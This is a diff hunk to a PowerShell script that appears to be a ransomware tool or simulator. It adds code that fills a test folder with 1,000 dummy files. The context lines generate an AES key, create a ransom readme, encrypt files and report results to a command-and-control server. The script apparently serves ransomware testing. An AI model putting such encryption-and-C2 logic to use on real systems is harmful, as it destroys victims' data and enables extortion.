@@ -331,6 +331,21 @@ else {
    Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
 
+   Write-Host "[+] Testing folder $Directory.." -ForegroundColor Blue
+   if (Test-Path -Path $Folder1) {
+      #Path exists. Cleanup.
+      Write-Output "    Test folder exist, cleanup folder" -ForegroundColor Blue
+   } else {
+   #Path doesn't exist. Creating new one!
+   Write-Output "    No test folder, creating one" -ForegroundColor Blue
+       mkdir $Folder1 | Out-Null
+   }
+   
+   Write-Output "[+] Creating 1k test txt files with test content" -ForegroundColor Blue
+   1..1000 | ForEach-Object {
+      Out-File -InputObject 'RansomwareTest' -FilePath $Folder1\TestTextFile$_.txt
+   }
+   
    Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
    CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; sleep 1
 
